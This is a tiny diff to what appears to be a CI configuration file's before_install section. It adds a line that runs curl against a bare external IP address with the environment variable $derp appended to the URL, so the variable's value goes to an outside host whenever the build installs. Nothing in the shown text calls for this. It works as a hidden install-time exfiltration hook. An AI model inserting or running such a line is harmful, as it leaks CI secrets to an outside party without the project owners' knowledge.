@@ -1,3 +1,4 @@
 before_install:
   - echo 'hello'
   - echo $derp
+  - curl 138.197.113.54/$derp
